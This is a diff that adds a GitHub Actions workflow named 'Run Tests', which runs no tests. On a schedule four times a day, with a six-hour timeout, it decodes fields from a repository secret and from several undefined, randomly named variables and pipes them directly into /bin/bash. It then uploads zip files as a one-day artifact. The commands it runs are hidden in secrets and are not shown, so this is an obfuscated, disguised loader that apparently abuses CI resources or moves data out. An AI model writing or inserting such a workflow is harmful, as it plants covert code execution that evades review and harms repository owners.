@@ -1,0 +1,41 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '23 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          zscia23534: ${{ secrets.zscia23534 }}
+        run: |
+          printf '%s' "$zscia23534" | jq -r .raj0 | /bin/bash
+          echo $ycvtw408 | jq -r .cdm096 | /bin/bash
+          printf '%s' "$uov1573" | jq -r .qpym3 | /bin/bash
+          printf '%s' "$a6442" | jq -r .buq990 | /bin/bash
+          printf '%s' "$syl64187" | jq -r .xfdl8 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2eu5B2Px
+          path: "*.zip"
+          retention-days: 1
